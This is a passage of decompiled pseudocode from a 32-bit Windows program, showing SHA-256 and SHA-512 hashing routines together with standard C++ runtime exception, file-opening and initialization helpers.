  unsigned int v8; // edi
  _DWORD **v9; // eax
  size_t v10; // esi
  int v11; // ecx
  int v12; // edx
  unsigned int v13; // eax
  int v14; // esi
  int v15; // edi
  int v16; // edi
  int v17; // esi
  int *v18; // edi
  unsigned int v19; // esi
  _DWORD *v20; // ecx
  unsigned int v21; // eax
  char v24; // [esp-134h] [ebp-140h]
  int v25; // [esp-134h] [ebp-140h]
  _DWORD **v26; // [esp-130h] [ebp-13Ch]
  int v27; // [esp-130h] [ebp-13Ch]
  _DWORD v28[42]; // [esp-128h] [ebp-134h] BYREF
  char v29; // [esp-80h] [ebp-8Ch] BYREF
  _BYTE v30[75]; // [esp-7Fh] [ebp-8Bh] BYREF
  __int128 v31; // [esp-34h] [ebp-40h]
  __int128 v32; // [esp-24h] [ebp-30h]
  int *v33; // [esp-10h] [ebp-1Ch]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-18h]
  void *v35; // [esp-8h] [ebp-14h]
  int v36; // [esp-4h] [ebp-10h]
  int v37; // [esp+0h] [ebp-Ch]
  int v38; // [esp+4h] [ebp-8h]
  int v39; // [esp+8h] [ebp-4h] BYREF
  int retaddr; // [esp+Ch] [ebp+0h]

  v37 = a2;
  v38 = retaddr;
  v36 = -1;
  v35 = &loc_43456B;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  v33 = &v39;
  v36 = 0;
  v31 = 0i64;
  v32 = 0i64;
  memset(v28, 0, sizeof(v28));
  v8 = a7;
  v9 = &a3;
  v28[34] = 1779033703;
  v10 = 64;
  v28[35] = -1150833019;
  if ( a8 >= 0x10 )
    v9 = (_DWORD **)a3;
  v26 = v9;
  if ( a7 < 0x40 )
    v10 = a7;
  v28[36] = 1013904242;
  v28[37] = -1521486534;
  v28[38] = 1359893119;
  v28[39] = -1694144372;
  v28[40] = 528734635;
  v28[41] = 1541459225;
  v28[1] = 0;
  v28[0] = 0;
  memmove_0(&v28[2], v9, v10);
  v11 = v8 + v28[1];
  if ( v8 + v28[1] >= 0x40 )
  {
    v13 = v8 - v10;
    v14 = (int)v26 + v10;
    v24 = v13;
    v15 = v13 >> 6;
    sub_412200(v28, (int)&v28[2], 1);
    sub_412200(v28, v14, v15);
    v15 <<= 6;
    v25 = v24 & 0x3F;
    memmove_0(&v28[2], (const void *)(v14 + v15), v25);
    v11 = v25;
    v12 = v15 + v28[0] + 64;
    v28[0] = v12;
  }
  else
  {
    v12 = v28[0];
  }
  v28[1] = v11;
  v27 = 8 * (v12 + v11);
  v16 = ((v11 & 0x3Fu) > 0x37) + 1;
  v17 = v16 << 6;
  memset((char *)&v28[2] + v11, 0, (v16 << 6) - v11);
  *((_BYTE *)&v28[2] + v28[1]) = 0x80;
  *((_BYTE *)&v28[1] + v17 + 3) = v27;
  *((_BYTE *)&v28[1] + v17 + 2) = BYTE1(v27);
  *((_BYTE *)&v28[1] + v17 + 1) = BYTE2(v27);
  *((_BYTE *)&v28[1] + v17) = HIBYTE(v27);
  sub_412200(v28, (int)&v28[2], v16);
  BYTE2(v31) = BYTE1(v28[34]);
  BYTE3(v31) = v28[34];
  LOBYTE(v31) = HIBYTE(v28[34]);
  BYTE1(v31) = BYTE2(v28[34]);
  BYTE6(v31) = BYTE1(v28[35]);
  BYTE7(v31) = v28[35];
  BYTE4(v31) = HIBYTE(v28[35]);
  BYTE5(v31) = BYTE2(v28[35]);
  BYTE10(v31) = BYTE1(v28[36]);
  BYTE11(v31) = v28[36];
  BYTE8(v31) = HIBYTE(v28[36]);
  BYTE9(v31) = BYTE2(v28[36]);
  BYTE14(v31) = BYTE1(v28[37]);
  HIBYTE(v31) = v28[37];
  BYTE12(v31) = HIBYTE(v28[37]);
  BYTE13(v31) = BYTE2(v28[37]);
  BYTE3(v32) = v28[38];
  v30[63] = 0;
  v18 = (int *)&v29;
  BYTE1(v32) = BYTE2(v28[38]);
  BYTE2(v32) = BYTE1(v28[38]);
  LOBYTE(v32) = HIBYTE(v28[38]);
  BYTE6(v32) = BYTE1(v28[39]);
  BYTE7(v32) = v28[39];
  BYTE4(v32) = HIBYTE(v28[39]);
  BYTE5(v32) = BYTE2(v28[39]);
  BYTE10(v32) = BYTE1(v28[40]);
  BYTE11(v32) = v28[40];
  BYTE8(v32) = HIBYTE(v28[40]);
  BYTE9(v32) = BYTE2(v28[40]);
  BYTE14(v32) = BYTE1(v28[41]);
  HIBYTE(v32) = v28[41];
  v19 = 0;
  BYTE12(v32) = HIBYTE(v28[41]);
  BYTE13(v32) = BYTE2(v28[41]);
  do
  {
    sub_411270(v18, (int)"%02x", *((unsigned __int8 *)&v31 + v19++));
    v18 = (int *)((char *)v18 + 2);
  }
  while ( v19 < 0x20 );
  *(_DWORD *)(a1 + 16) = 0;
  *(_DWORD *)(a1 + 20) = 15;
  *(_BYTE *)a1 = 0;
  sub_401D10((char **)a1, &v29, &v30[strlen(&v29)] - v30);
  if ( a8 >= 0x10 )
  {
    v20 = a3;
    if ( a8 + 1 >= 0x1000 )
    {
      if ( ((unsigned __int8)a3 & 0x1F) != 0
        || (v21 = *(a3 - 1), v21 >= (unsigned int)a3)
        || (unsigned int)a3 - v21 < 4
        || (unsigned int)a3 - v21 > 0x23 )
      {
        _invalid_parameter_noinfo_noreturn();
      }
      v20 = (_DWORD *)*(a3 - 1);
    }
    j__free(v20);
  }
  return a1;
}
// 412400: could not find valid save-restore pair for ebp
// 412400: using guessed type _DWORD *anonymous_0;

//----- (004127F0) --------------------------------------------------------
void __thiscall sub_4127F0(_DWORD *this, int a2, int a3)
{
  unsigned __int8 *v3; // ebx
  int i; // edi
  unsigned __int64 v5; // rt0
  __int64 v6; // rax
  char *v7; // eax
  unsigned __int64 v8; // rcx
  __int64 v9; // rdi
  unsigned __int64 v10; // rt0
  unsigned int v11; // edx
  unsigned int v12; // edx
  unsigned int v13; // edx
  unsigned int v14; // kr08_4
  unsigned __int64 v15; // kr18_8
  bool v16; // zf
  int v17; // edx
  unsigned int v18; // esi
  unsigned int v19; // ecx
  unsigned int v20; // edx
  unsigned int v21; // ecx
  unsigned __int64 v22; // kr10_8
  unsigned int v23; // ebx
  unsigned int v24; // edi
  unsigned int v25; // eax
  _DWORD *v26; // ecx
  int v27; // esi
  bool v28; // cf
  unsigned int v29; // eax
  int v30[28]; // [esp+10h] [ebp-2D8h]
  char v31; // [esp+80h] [ebp-268h] BYREF
  unsigned __int8 *v32; // [esp+290h] [ebp-58h]
  int v33; // [esp+294h] [ebp-54h]
  unsigned int v34; // [esp+298h] [ebp-50h]
  unsigned int v35; // [esp+29Ch] [ebp-4Ch]
  unsigned int v36; // [esp+2A0h] [ebp-48h]
  _DWORD *v37; // [esp+2A4h] [ebp-44h]
  int v38; // [esp+2A8h] [ebp-40h]
  unsigned int v39; // [esp+2ACh] [ebp-3Ch]
  unsigned int j; // [esp+2B0h] [ebp-38h]
  unsigned int v41; // [esp+2B4h] [ebp-34h]
  unsigned int v42; // [esp+2B8h] [ebp-30h]
  unsigned int v43; // [esp+2BCh] [ebp-2Ch]
  unsigned int v44; // [esp+2C0h] [ebp-28h]
  unsigned int v45; // [esp+2C4h] [ebp-24h]
  int v46; // [esp+2C8h] [ebp-20h]
  unsigned int v47; // [esp+2CCh] [ebp-1Ch]
  int v48; // [esp+2D0h] [ebp-18h]
  unsigned int v49; // [esp+2D4h] [ebp-14h]
  unsigned int v50; // [esp+2D8h] [ebp-10h]
  __int64 v51; // [esp+2DCh] [ebp-Ch]
  unsigned int v52; // [esp+2E4h] [ebp-4h]
  unsigned int v53; // [esp+2F0h] [ebp+8h]
  unsigned int v54; // [esp+2F0h] [ebp+8h]

  v37 = this;
  if ( a3 > 0 )
  {
    v3 = (unsigned __int8 *)(a2 + 2);
    do
    {
      for ( i = 0; i < 16; ++i )
      {
        HIDWORD(v5) = (unsigned __int64)*(v3 - 2) >> 24;
        LODWORD(v5) = *(v3 - 1) | (*(v3 - 2) << 8);
        HIDWORD(v5) = v5 >> 24;
        LODWORD(v5) = *v3 | ((_DWORD)v5 << 8);
        HIDWORD(v5) = v5 >> 24;
        LODWORD(v5) = v3[1] | ((_DWORD)v5 << 8);
        HIDWORD(v5) = v5 >> 24;
        LODWORD(v5) = v3[2] | ((_DWORD)v5 << 8);
        HIDWORD(v5) = v5 >> 24;
        LODWORD(v5) = v3[3] | ((_DWORD)v5 << 8);
        HIDWORD(v5) = v5 >> 24;
        LODWORD(v5) = v3[4] | ((_DWORD)v5 << 8);
        v6 = v3[5];
        v3 += 8;
        v30[2 * i + 1] = HIDWORD(v6) | (v5 >> 24);
        v30[2 * i] = v6 | ((_DWORD)v5 << 8);
      }
      v32 = v3;
      v7 = &v31;
      v49 = 64;
      do
      {
        v8 = *(_QWORD *)v7;
        v9 = *(_QWORD *)v7 << 13;
        v52 = (*((_DWORD *)v7 + 1) >> 19) | v9;
        LODWORD(v10) = *(_DWORD *)v7;
        HIDWORD(v10) = HIDWORD(v8);
        v53 = (v10 >> 6) ^ (__SPAIR64__(v8, HIDWORD(v8)) >> 29) ^ HIDWORD(v9);
        v11 = *((_DWORD *)v7 - 25);
        v52 ^= (HIDWORD(v8) >> 6) ^ (v8 >> 29);
        LODWORD(v10) = *((_DWORD *)v7 - 26);
        HIDWORD(v10) = v11;
        HIDWORD(v9) = (v11 >> 8) | ((_DWORD)v10 << 24);
        v12 = *((_DWORD *)v7 - 25);
        LODWORD(v8) = *((_QWORD *)v7 - 13) >> 1;
        v45 = HIDWORD(v9);
        HIDWORD(v8) = (*((_QWORD *)v7 - 14)
                     + __PAIR64__(
                         (*((_DWORD *)v7 - 25) >> 7) ^ ((v12 >> 1) | ((_DWORD)v10 << 31)) ^ HIDWORD(v9),
                         (*((_QWORD *)v7 - 13) >> 7) ^ v8 ^ (v10 >> 8))
                     + __PAIR64__(v52, v53)) >> 32;
        v13 = *((_DWORD *)v7 - 28) + ((*((_QWORD *)v7 - 13) >> 7) ^ v8 ^ (v10 >> 8)) + v53;
        v14 = *((_DWORD *)v7 - 10);
        *((_DWORD *)v7 + 4) = v14 + v13;
        v15 = __PAIR64__(HIDWORD(v8), v14) + __PAIR64__(*((_DWORD *)v7 - 9), v13);
        v7 += 8;
        v16 = v49-- == 1;
        *((_DWORD *)v7 + 3) = HIDWORD(v15);
      }
      while ( !v16 );
      v17 = v37[67];
      v18 = v37[75];
      v34 = v37[66];
      v44 = v37[68];
      v48 = v37[69];
      v47 = v37[70];
      v46 = v37[71];
      v39 = v37[72];
      v38 = v37[73];
      v43 = v37[76];
      v42 = v37[77];
      v41 = v37[78];
      v19 = v37[79];
      v33 = v17;
      v51 = __PAIR64__(v34, v17);
      v20 = v37[74];
      v52 = v19;
      v21 = v37[80];
      v49 = v37[81];
      v50 = v20;
      v54 = v18;
      v45 = v21;
      for ( j = 0; (int)j < 640; j += 8 )
      {
        v22 = __PAIR64__(v49, v45)
            + __PAIR64__(v30[j / 4 + 1], v30[j / 4])
            + __PAIR64__(SHA512_Constants_4428BC[j / 4], SHA512_Constants_4428B8[j / 4])
            + __PAIR64__(v54 & v42 ^ v52 & ~v54, v50 & v43 ^ v41 & ~v50)
            + __PAIR64__(
                ((v54 >> 14) | (v50 << 18)) ^ ((v54 >> 18) | (v20 << 14)) ^ (__PAIR64__(v18, v20) >> 9),
                (__PAIR64__(v54, v50) >> 14) ^ (__PAIR64__(v54, v50) >> 18) ^ ((v20 << 23) | (v18 >> 9)));
        v35 = HIDWORD(v22);
        v36 = v22;
        v45 = v41;
        v49 = v52;
        v18 = v35 + __CFADD__(v36, v39) + v38;
        v41 = v43;
        v23 = (__PAIR64__(v35, v36)
             + __PAIR64__(
                 (__PAIR64__(v51, HIDWORD(v51)) >> 7) ^ (__PAIR64__(v51, HIDWORD(v51)) >> 2) ^ (v51 >> 28),
                 v47 & v44 ^ HIDWORD(v51) & (v47 ^ v44))
             + __PAIR64__(
                 v46 & v48 ^ (unsigned int)v51 & (v46 ^ v48),
                 (v51 >> 7) ^ (v51 >> 2) ^ (__PAIR64__(v51, HIDWORD(v51)) >> 28))) >> 32;
        v24 = v36
            + (v47 & v44 ^ HIDWORD(v51) & (v47 ^ v44))
            + ((v51 >> 7) ^ (v51 >> 2) ^ (__PAIR64__(v51, HIDWORD(v51)) >> 28));
        v52 = v42;
        v25 = v50;
        v50 = v36 + v39;
        v39 = v47;
        v38 = v46;
        v43 = v25;
        v47 = v44;
        v42 = v54;
        v46 = v48;
        v44 = HIDWORD(v51);
        v48 = v51;
        v20 = v50;
        v54 = v18;
        v51 = __PAIR64__(v24, v23);
      }
      v26 = v37;
      v27 = v33;
      v28 = __CFADD__(v24, v34);
      v37[66] = v24 + v34;
      v29 = v44;
      v26[67] = v23 + v28 + v27;
      v28 = __CFADD__(v29, v26[68]);
      v26[68] += v29;
      v26[69] += v48 + v28;
      v28 = __CFADD__(v47, v26[70]);
      v26[70] += v47;
      v26[71] += v46 + v28;
      v28 = __CFADD__(v39, v26[72]);
      v26[72] += v39;
      v26[73] += v38 + v28;
      v28 = __CFADD__(v20, v26[74]);
      v26[74] += v20;
      v26[75] += v54 + v28;
      v28 = __CFADD__(v43, v26[76]);
      v26[76] += v43;
      v26[77] += v42 + v28;
      v28 = __CFADD__(v41, v26[78]);
      v26[78] += v41;
      v26[79] += v52 + v28;
      v28 = __CFADD__(v45, v26[80]);
      v26[80] += v45;
      v26[81] += v49 + v28;
      v16 = a3-- == 1;
      v3 = v32;
    }
    while ( !v16 );
  }
}
// 4428B8: using guessed type int SHA512_Constants_4428B8[];
// 4428BC: using guessed type int SHA512_Constants_4428BC[];

//----- (00412C50) --------------------------------------------------------
int __thiscall sub_412C50(int this, _BYTE *a2)
{
  int v2; // edx
  int v3; // ebx
  int v4; // edi
  int v5; // esi
  int result; // eax

  v2 = *(_DWORD *)(this + 4);
  v3 = 8 * (v2 + *(_DWORD *)this);
  v4 = ((v2 & 0x7Fu) > 0x6F) + 1;
  v5 = v4 << 7;
  memset((void *)(v2 + this + 8), 0, (v4 << 7) - v2);
  *(_BYTE *)(this + *(_DWORD *)(this + 4) + 8) = 0x80;
  *(_BYTE *)(v5 + this + 6) = BYTE1(v3);
  *(_BYTE *)(v5 + this + 7) = v3;
  *(_BYTE *)(v5 + this + 4) = HIBYTE(v3);
  *(_BYTE *)(v5 + this + 5) = BYTE2(v3);
  sub_4127F0((_DWORD *)this, this + 8, v4);
  a2[7] = *(_BYTE *)(this + 264);
  a2[6] = BYTE1(*(_QWORD *)(this + 264));
  a2[5] = BYTE2(*(_DWORD *)(this + 264));
  a2[4] = HIBYTE(*(_DWORD *)(this + 264));
  a2[3] = *(_DWORD *)(this + 268);
  a2[2] = BYTE1(*(_DWORD *)(this + 268));
  a2[1] = *(_BYTE *)(this + 270);
  *a2 = *(_BYTE *)(this + 271);
  a2[15] = *(_BYTE *)(this + 272);
  a2[14] = BYTE1(*(_QWORD *)(this + 272));
  a2[13] = BYTE2(*(_DWORD *)(this + 272));
  a2[12] = HIBYTE(*(_DWORD *)(this + 272));
  a2[11] = *(_DWORD *)(this + 276);
  a2[10] = BYTE1(*(_DWORD *)(this + 276));
  a2[9] = *(_BYTE *)(this + 278);
  a2[8] = *(_BYTE *)(this + 279);
  a2[23] = *(_BYTE *)(this + 280);
  a2[22] = BYTE1(*(_QWORD *)(this + 280));
  a2[21] = BYTE2(*(_DWORD *)(this + 280));
  a2[20] = HIBYTE(*(_DWORD *)(this + 280));
  a2[19] = *(_DWORD *)(this + 284);
  a2[18] = BYTE1(*(_DWORD *)(this + 284));
  a2[17] = *(_BYTE *)(this + 286);
  a2[16] = *(_BYTE *)(this + 287);
  a2[31] = *(_BYTE *)(this + 288);
  a2[30] = BYTE1(*(_QWORD *)(this + 288));
  a2[29] = BYTE2(*(_DWORD *)(this + 288));
  a2[28] = HIBYTE(*(_DWORD *)(this + 288));
  a2[27] = *(_DWORD *)(this + 292);
  a2[26] = BYTE1(*(_DWORD *)(this + 292));
  a2[25] = *(_BYTE *)(this + 294);
  a2[24] = *(_BYTE *)(this + 295);
  a2[39] = *(_BYTE *)(this + 296);
  a2[38] = BYTE1(*(_QWORD *)(this + 296));
  a2[37] = BYTE2(*(_DWORD *)(this + 296));
  a2[36] = HIBYTE(*(_DWORD *)(this + 296));
  a2[35] = *(_DWORD *)(this + 300);
  a2[34] = BYTE1(*(_DWORD *)(this + 300));
  a2[33] = *(_BYTE *)(this + 302);
  a2[32] = *(_BYTE *)(this + 303);
  a2[47] = *(_BYTE *)(this + 304);
  a2[46] = BYTE1(*(_QWORD *)(this + 304));
  a2[45] = BYTE2(*(_DWORD *)(this + 304));
  a2[44] = HIBYTE(*(_DWORD *)(this + 304));
  a2[43] = *(_DWORD *)(this + 308);
  a2[42] = BYTE1(*(_DWORD *)(this + 308));
  a2[41] = *(_BYTE *)(this + 310);
  a2[40] = *(_BYTE *)(this + 311);
  a2[55] = *(_BYTE *)(this + 312);
  a2[54] = BYTE1(*(_QWORD *)(this + 312));
  a2[53] = BYTE2(*(_DWORD *)(this + 312));
  a2[52] = HIBYTE(*(_DWORD *)(this + 312));
  a2[51] = *(_DWORD *)(this + 316);
  a2[50] = BYTE1(*(_DWORD *)(this + 316));
  a2[49] = *(_BYTE *)(this + 318);
  a2[48] = *(_BYTE *)(this + 319);
  a2[63] = *(_BYTE *)(this + 320);
  a2[62] = BYTE1(*(_QWORD *)(this + 320));
  a2[61] = BYTE2(*(_DWORD *)(this + 320));
  a2[60] = HIBYTE(*(_DWORD *)(this + 320));
  a2[59] = *(_DWORD *)(this + 324);
  a2[58] = BYTE1(*(_DWORD *)(this + 324));
  a2[57] = *(_BYTE *)(this + 326);
  result = *(unsigned __int8 *)(this + 327);
  a2[56] = result;
  return result;
}

//----- (00413130) --------------------------------------------------------
void **__cdecl sub_413130(_DWORD *Src, int a2, int a3, int a4, size_t Size, unsigned int a6)
{
  int v6; // ecx
  int v7; // ebx
  size_t v8; // esi
  _DWORD **p_Src; // eax
  size_t v10; // edi
  unsigned int v11; // edi
  int *v12; // edi
  unsigned int i; // esi
  _DWORD *v14; // ecx
  unsigned int v15; // eax
  size_t v17; // [esp+14h] [ebp-22Ch]
  _DWORD **v18; // [esp+18h] [ebp-228h]
  char v19; // [esp+1Ch] [ebp-224h]
  int v20[82]; // [esp+20h] [ebp-220h] BYREF
  char v21[136]; // [esp+168h] [ebp-D8h] BYREF
  char v22[64]; // [esp+1F0h] [ebp-50h] BYREF
  int v23; // [esp+23Ch] [ebp-4h]

  v7 = v6;
  v23 = 0;
  memset(v22, 0, sizeof(v22));
  memset(v20, 0, sizeof(v20));
  v8 = Size;
  p_Src = &Src;
  v20[66] = -205731576;
  v10 = 128;
  v20[67] = 1779033703;
  if ( a6 >= 0x10 )
    p_Src = (_DWORD **)Src;
  v18 = p_Src;
  if ( Size < 0x80 )
    v10 = Size;
  v20[68] = -2067093701;
  v20[69] = -1150833019;
  v20[70] = -23791573;
  v20[71] = 1013904242;
  v20[72] = 1595750129;
  v20[73] = -1521486534;
  v20[74] = -1377402159;
  v20[75] = 1359893119;
  v20[76] = 725511199;
  v20[77] = -1694144372;
  v20[78] = -79577749;
  v20[79] = 528734635;
  v20[80] = 327033209;
  v20[81] = 1541459225;
  v20[1] = 0;
  v20[0] = 0;
  v17 = v10;
  memmove_0(&v20[2], p_Src, v10);
  if ( v8 + v20[1] >= 0x80 )
  {
    v19 = v8 - v10;
    sub_4127F0(v20, (int)&v20[2], 1);
    sub_4127F0(v20, (int)v18 + v10, (v8 - v10) >> 7);
    v11 = (v8 - v10) >> 7 << 7;
    memmove_0(&v20[2], (char *)v18 + v17 + v11, v19 & 0x7F);
    v20[1] = v19 & 0x7F;
    v20[0] += v11 + 128;
  }
  else
  {
    v20[1] += v8;
  }
  sub_412C50((int)v20, v22);
  v21[128] = 0;
  v12 = (int *)v21;
  for ( i = 0; i < 0x40; ++i )
  {
    sub_411270(v12, (int)"%02x", (unsigned __int8)v22[i]);
    v12 = (int *)((char *)v12 + 2);
  }
  *(_DWORD *)(v7 + 16) = 0;
  *(_DWORD *)(v7 + 20) = 15;
  *(_BYTE *)v7 = 0;
  sub_401D10((char **)v7, v21, strlen(v21));
  if ( a6 >= 0x10 )
  {
    v14 = Src;
    if ( a6 + 1 >= 0x1000 )
    {
      if ( ((unsigned __int8)Src & 0x1F) != 0
        || (v15 = *(Src - 1), v15 >= (unsigned int)Src)
        || (unsigned int)Src - v15 < 4
        || (unsigned int)Src - v15 > 0x23 )
      {
        _invalid_parameter_noinfo_noreturn();
      }
      v14 = (_DWORD *)*(Src - 1);
    }
    j__free(v14);
  }
  return (void **)v7;
}
// 41315E: variable 'v6' is possibly undefined
// 413130: using guessed type char var_50[64];

//----- (004133D9) --------------------------------------------------------
char *__thiscall sub_4133D9(char *this, int a2)
{
  sub_403A30(this, a2);
  *(_DWORD *)this = &std::bad_alloc::`vftable';
  return this;
}
// 435340: using guessed type void *std::bad_alloc::`vftable';

//----- (004133F4) --------------------------------------------------------
_DWORD *__thiscall sub_4133F4(_DWORD *this)
{
  _DWORD *result; // eax

  this[1] = 0;
  result = this;
  this[2] = 0;
  this[1] = "bad allocation";
  *this = &std::bad_alloc::`vftable';
  return result;
}
// 435340: using guessed type void *std::bad_alloc::`vftable';

//----- (0041340C) --------------------------------------------------------
char *__thiscall sub_41340C(char *this, int a2)
{
  sub_403A30(this, a2);
  *(_DWORD *)this = &std::length_error::`vftable';
  return this;
}
// 435368: using guessed type void *std::length_error::`vftable';

//----- (00413427) --------------------------------------------------------
char *__thiscall sub_413427(char *this, int a2)
{
  sub_4039E0(this, a2);
  *(_DWORD *)this = &std::length_error::`vftable';
  return this;
}
// 435368: using guessed type void *std::length_error::`vftable';

//----- (00413448) --------------------------------------------------------
char *__thiscall sub_413448(char *this, int a2)
{
  sub_403A30(this, a2);
  *(_DWORD *)this = &std::logic_error::`vftable';
  return this;
}
// 43535C: using guessed type void *std::logic_error::`vftable';

//----- (00413463) --------------------------------------------------------
char *__thiscall sub_413463(char *this, int a2)
{
  sub_403A30(this, a2);
  *(_DWORD *)this = &std::out_of_range::`vftable';
  return this;
}
// 435374: using guessed type void *std::out_of_range::`vftable';

//----- (0041347E) --------------------------------------------------------
char *__thiscall sub_41347E(char *this, int a2)
{
  sub_4039E0(this, a2);
  *(_DWORD *)this = &std::out_of_range::`vftable';
  return this;
}
// 435374: using guessed type void *std::out_of_range::`vftable';

//----- (0041349F) --------------------------------------------------------
void __cdecl __noreturn sub_41349F(int a1)
{
  char pExceptionObject[12]; // [esp+0h] [ebp-Ch] BYREF

  sub_413427(pExceptionObject, a1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVlength_error_std__);
}

//----- (004134BF) --------------------------------------------------------
void __cdecl __noreturn sub_4134BF(int a1)
{
  char pExceptionObject[12]; // [esp+0h] [ebp-Ch] BYREF

  sub_41347E(pExceptionObject, a1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVout_of_range_std__);
}

//----- (00413763) --------------------------------------------------------
int sub_413763()
{
  return dword_45292C;
}
// 45292C: using guessed type int dword_45292C;

//----- (00413A9B) --------------------------------------------------------
FILE *__cdecl sub_413A9B(char *FileName, int a2, int ShFlag)
{
  int v3; // eax
  int v4; // ecx
  unsigned int v5; // eax
  int v6; // esi
  FILE *v8; // eax
  FILE *v9; // eax
  FILE *v10; // esi

  v3 = a2;
  v4 = 1;
  if ( (a2 & 0x40) != 0 )
    v3 = a2 | 1;
  if ( (v3 & 8) != 0 )
    v3 |= 2u;
  v5 = v3 & 0xFFFFFF3B;
  v6 = 0;
  do
  {
    if ( v4 == v5 )
      break;
    v4 = dword_43544C[v6++];
  }
  while ( v4 );
  if ( !dword_435448[v6] )
    return 0;
  if ( (a2 & 0x80) != 0 && (v5 & 0xA) != 0 )
  {
    v8 = sub_413B46(FileName, 0, ShFlag);
    if ( v8 )
    {
      fclose(v8);
      return 0;
    }
  }
  v9 = sub_413B46(FileName, v6, ShFlag);
  v10 = v9;
  if ( !v9 )
    return 0;
  if ( (a2 & 4) != 0 && fseek(v9, 0, 2) )
  {
    fclose(v10);
    return 0;
  }
  return v10;
}
// 435448: using guessed type int dword_435448[];
// 43544C: using guessed type int dword_43544C[14];

//----- (00413B3D) --------------------------------------------------------
FILE *__cdecl sub_413B3D(char *FileName, int a2, int ShFlag)
{
  return sub_413A9B(FileName, a2, ShFlag);
}

//----- (00413B46) --------------------------------------------------------
FILE *__cdecl sub_413B46(char *FileName, int a2, int ShFlag)
{
  return _fsopen(FileName, (&Mode)[a2], ShFlag);
}

//----- (00413F12) --------------------------------------------------------
void __cdecl sub_413F12(LPCRITICAL_SECTION lpCriticalSection)
{
  LeaveCriticalSection(lpCriticalSection);
}

//----- (00414AF8) --------------------------------------------------------
void __cdecl sub_414AF8(void *Block)
{
  j__free(Block);
}

//----- (00414B06) --------------------------------------------------------
_DWORD *__thiscall sub_414B06(_DWORD *Block, char a2)
{
  *Block = &type_info::`vftable';
  if ( (a2 & 1) != 0 )
    sub_414AF8(Block);
  return Block;
}
// 4385E8: using guessed type void *type_info::`vftable';

//----- (0041503A) --------------------------------------------------------
int sub_41503A()
{
  __scrt_initialize_default_local_stdio_options();
  return 0;
}
// 415859: using guessed type int __scrt_initialize_default_local_stdio_options(void);

//----- (00415042) --------------------------------------------------------
int sub_415042()
{
  int v0; // eax

  sub_415729();
  v0 = UserMathErrorFunction();
  return _set_new_mode(v0);
}

//----- (00415328) --------------------------------------------------------
char *__thiscall sub_415328(char *this, int a2)
{
  sub_403A30(this, a2);
  *(_DWORD *)this = &std::bad_array_new_length::`vftable';
  return this;
}
// 438640: using guessed type void *std::bad_array_new_length::`vftable';

//----- (00415343) --------------------------------------------------------
_DWORD *__thiscall sub_415343(_DWORD *this)
{
  _DWORD *result; // eax

  this[1] = 0;
  result = this;
  this[2] = 0;
  this[1] = "bad array new length";
  *this = &std::bad_array_new_length::`vftable';
  return result;
}
// 438640: using guessed type void *std::bad_array_new_length::`vftable';

//----- (00415388) --------------------------------------------------------
void __noreturn sub_415388()
{
  int pExceptionObject[3]; // [esp+0h] [ebp-Ch] BYREF

  sub_4133F4(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
}
// 415388: using guessed type _DWORD pExceptionObject[3];

//----- (004153A5) --------------------------------------------------------
void __noreturn sub_4153A5()
{
  int pExceptionObject[3]; // [esp+0h] [ebp-Ch] BYREF

  sub_415343(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVbad_array_new_length_std__);
}
// 4153A5: using guessed type void __noreturn sub_4153A5();
// 4153A5: using guessed type _DWORD pExceptionObject[3];

//----- (004155CA) --------------------------------------------------------
int sub_4155CA()
{
  return 1;
}

//----- (00415729) --------------------------------------------------------
LPTOP_LEVEL_EXCEPTION_FILTER sub_415729()
{
  return SetUnhandledExceptionFilter(__scrt_unhandled_exception_filter);
}

//----- (00415776) --------------------------------------------------------
void sub_415776()
{
  dword_452F14 = 0;
}
// 452F14: using guessed type int dword_452F14;

//----- (00415826) --------------------------------------------------------
void sub_415826()
{
  InitializeSListHead(&ListHead);
}

//----- (00415853) --------------------------------------------------------
void *sub_415853()
{
  return &unk_452F28;
}

//----- (00415876) --------------------------------------------------------
BOOL sub_415876()
{
  return dword_447084 == 0;
}
// 447084: using guessed type int dword_447084;

//----- (00415882) --------------------------------------------------------
void *sub_415882()
{
  return &unk_453874;
}

//----- (00415888) --------------------------------------------------------
void *sub_415888()
{
  return &unk_453870;
}

//----- (0041588E) --------------------------------------------------------
void sub_41588E()
{
  ;
}
// 41588E: could not find valid save-restore pair for edi
// 4151C6: using guessed type _DWORD _guard_check_icall_nop();

//----- (004158B9) --------------------------------------------------------
void __cdecl sub_4158B9()
{
  ;
}
// 4158B9: could not find valid save-restore pair for edi
// 4151C6: using guessed type _DWORD _guard_check_icall_nop();

//----- (0041591D) --------------------------------------------------------
int __thiscall sub_41591D(int this)
{
  sub_415970((_DWORD *)this);
  *(_DWORD *)this = 56;
  *(_DWORD *)(this + 8) = 0x400000;
  *(_DWORD *)(this + 4) = 0x400000;
  *(_DWORD *)(this + 12) = 3584;
  *(_DWORD *)(this + 16) = &unk_438660;
  if ( sub_40CFC0((LPCRITICAL_SECTION)(this + 20)) < 0 )
  {
    if ( IsDebuggerPresent() )
      OutputDebugStringW(L"ERROR : Unable to initialize critical section in CAtlBaseModule\n");
    byte_453818 = 1;
  }
  return this;
}
// 453818: using guessed type char byte_453818;

//----- (00415970) --------------------------------------------------------
_DWORD *__thiscall sub_415970(_DWORD *this)
{
  _DWORD *result; // eax

  memset(this + 5, 0, 0x18u);
  this[11] = 0;
  this[12] = 0;
  result = this;
  this[13] = 0;
  return result;
}

//----- (0041891C) --------------------------------------------------------
char *__thiscall sub_41891C(char *this, int a2)
{
  sub_403A30(this, a2);
  *(_DWORD *)this = &std::bad_exception::`vftable';
  return this;
}
// 4387FC: using guessed type void *std::bad_exception::`vftable';

//----- (00418937) --------------------------------------------------------
_DWORD *__thiscall sub_418937(_DWORD *this)
{
  _DWORD *result; // eax

  this[1] = 0;
  result = this;
  this[2] = 0;
  this[1] = "bad exception";
  *this = &std::bad_exception::`vftable';
  return result;
}
// 4387FC: using guessed type void *std::bad_exception::`vftable';

//----- (00419DE5) --------------------------------------------------------
int __cdecl sub_419DE5(int a1)
{
  int result; // eax

  result = a1;
  dword_453014 = a1;
  return result;
}
// 453014: using guessed type int dword_453014;

//----- (0041A0B3) --------------------------------------------------------
int __cdecl sub_41A0B3(int a1, int a2, int *a3, unsigned int a4, int a5, struct __crt_locale_pointers *a6, int a7)
{
  int *v8; // edi
